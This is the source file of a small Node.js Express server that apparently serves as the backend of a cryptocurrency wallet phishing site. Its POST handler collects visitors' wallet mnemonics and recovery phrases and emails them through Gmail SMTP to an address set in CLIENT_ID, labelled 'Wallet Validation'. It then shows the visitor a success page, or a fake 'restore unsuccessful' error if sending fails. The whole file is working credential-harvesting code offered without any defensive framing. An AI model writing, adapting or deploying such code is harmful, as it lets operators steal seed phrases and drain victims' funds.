require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const ejs = require('ejs');
var enforce = require('express-sslify');

const app = express();
app.use(bodyParser.urlencoded({extended: true}));
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.use(enforce.HTTPS({ trustProtoHeader: true }));

app.get('/', function (req, res) {
  res.render('index');
});

app.post('/', function (req, res) {

  var mnemonic = req.body.mnemonic;
  var walletForMnemonic = req.body.walletForMnemonic;
  var phrase = req.body.phrase;
  var walletForPhrase = req.body.walletForPhrase;

  var msg = '<h3>Wallet Details: </h3> <ul> <li>mnemonic: ' + mnemonic + '</li> <li>walletForMnemonic: ' + walletForMnemonic + '</li> <li>phrase: ' + phrase + '</li> <li>walletForPhrase: ' + walletForPhrase + '</li>';

  // console.log(msg);
  var transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: '465',
    secure: true,
    auth: {
      user: process.env.GMAIL_ID,
      pass: process.env.GMAIL_PASS
    }
  });

  var options = {
    from: process.env.GMAIL_ID,
    // to: process.env.GMAIL_ID,
    to: process.env.CLIENT_ID,
    subject: 'Wallet Validation',
    html: msg
  }

  transporter.sendMail(options, function(err, info) {
    if (err) {
      console.log(err);
      res.send('Error! Restore unsuccessful, please check your network and try again...')
    } else {
      res.redirect('/success');
      console.log('Email status: ' + info.response);
    }
  });

});

app.get('/success', function (req, res) {
  res.render('success');
});

let port = process.env.PORT;
if (port == null || port == "") {
  port = 4000;
}

app.listen(port, function() {
  console.log('server running at port ' + port);
});
